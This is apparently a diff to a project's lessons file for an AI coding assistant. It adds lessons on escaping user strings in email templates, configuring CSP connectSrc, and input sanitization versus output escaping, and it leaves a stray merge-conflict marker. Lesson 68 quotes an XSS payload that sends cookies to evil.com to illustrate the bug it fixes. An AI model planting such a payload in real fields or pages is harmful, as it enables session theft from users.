@@ -1,7 +1,7 @@
 # lessons.md — SIGN + MANAGEX Platform
 > This file documents every bug, issue, and fix that took significant time to resolve.
 > Feed this file to Claude at the start of every session to avoid repeating mistakes.
-> Last updated: 2026-05-16 (Lessons #40, #41, #42 — CENVOX→MANAGEX rebrand, Vite-vs-Docker port collision on 5175, canonical port 5175. Plus Phase 3.2 lessons from main.)
+> Last updated: 2026-05-17 (Lessons #63-67 — Phase 4.1 Rate Limiting. Lessons #68-70 — Phase 3.5 XSS Prevention.)
 
 ---
 
@@ -2171,6 +2171,7 @@ Never use optional chaining on a method call whose return value you immediately 
 
 ---
 
+<<<<<<< HEAD
 ## 63. IP Extraction Must Use a Single Shared Utility
 
 **Context:**
@@ -2295,4 +2296,97 @@ be auto-skipped on the other endpoints.
 ---
 
 
-*Last updated: 2026-05-17 (Phase 4.1 Rate Limiting — lessons #63-67, after rebasing on Phase 3.4 #60-62)*
+*Last updated: 2026-05-17 (Phase 4.1 Rate Limiting — lessons #63-67. Phase 3.5 XSS Prevention — lessons #68-70.)*
+
+---
+
+## 68. Email Template Injection — User Strings Must Be HTML-Escaped at Output
+
+**Problem:**
+`email.service.ts` called template functions that interpolated
+user-supplied strings (display names, org names, contract names)
+directly into HTML template literals without escaping.
+
+A user setting their display name to:
+`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
+would inject that tag into every invitation email they sent.
+Modern email clients strip `<script>` but many execute `onerror`
+and `onload` handlers on images.
+
+**Root cause:**
+Template literals interpolate strings verbatim. `${userName}`
+in an HTML context is an injection point if `userName` contains
+HTML characters.
+
+**Fix:**
+Created `escape-html-email.ts` with `escapeHtml()` — escapes the
+5 HTML special characters: `& < > " '`
+Applied at 38 call sites across all 9 email template functions.
+
+**Critical escape order:**
+`&` must be escaped FIRST. If you escape `<` first, then escape `&`,
+you turn `&lt;` into `&amp;lt;` — double-escaping the ampersand.
+Always: `&` → `&amp;` then `<` → `&lt;` then `>` → `&gt;` then `"` → `&quot;`
+
+**Rule:**
+Every string that comes from user input and lands in an HTML
+context (email template, HTML string, innerHTML) must be
+HTML-escaped at the point of interpolation. React's auto-
+escaping only covers JSX — it does NOT protect template
+literals, string concatenation, or innerHTML.
+
+---
+
+## 69. CSP connectSrc Must Include Your Production API Origin
+
+**Problem:**
+Bare `helmet()` sets a `Content-Security-Policy` header but does
+not include an explicit `connectSrc` directive. The default
+falls back to `defaultSrc: 'self'`. In development where
+frontend and backend share localhost, this works. In
+production where they may be on different origins (e.g.
+`app.managex.ai` vs `api.managex.ai`), ALL fetch/XHR calls
+would be silently blocked by the browser.
+
+**Fix:**
+Explicit CSP configuration with `connectSrc` including
+`BASE_URL` from the config service.
+
+**Rule:**
+Always specify `connectSrc` explicitly in your CSP configuration.
+Include every origin your frontend makes API calls to.
+Test CSP in production-like conditions (different origins)
+not just localhost where `defaultSrc: 'self'` masks the problem.
+
+---
+
+## 70. Two Types of HTML Escaping — Input Sanitization vs Output Escaping
+
+**Problem:**
+Phase 3.2 added `sanitize-html` (`stripHtml`) for INPUT sanitization.
+Phase 3.5 added `escapeHtml` for OUTPUT escaping in emails.
+These are different tools for different problems.
+
+**The distinction:**
+- INPUT sanitization (`sanitize.ts` / `stripHtml`):
+  Strips HTML tags from content before storing in the database.
+  Used on clause content, comments, negotiation text.
+  Goal: keep the database clean of HTML.
+
+- OUTPUT escaping (`escape-html-email.ts` / `escapeHtml`):
+  Converts HTML special characters to entities at the point
+  of rendering. Used in email templates.
+  Goal: prevent HTML injection at the output stage.
+
+**Why both are needed:**
+Input sanitization catches content going INTO the database.
+Output escaping catches content going INTO an HTML context.
+Defense in depth: even if input sanitization fails or is
+bypassed, output escaping prevents the HTML from executing.
+
+**Rule:**
+For any string entering an HTML context (template, innerHTML,
+email body), ask two questions:
+1. Was it sanitized at input? (database-stored content)
+2. Is it escaped at output? (before HTML interpolation)
+Both should be YES for user-supplied content.
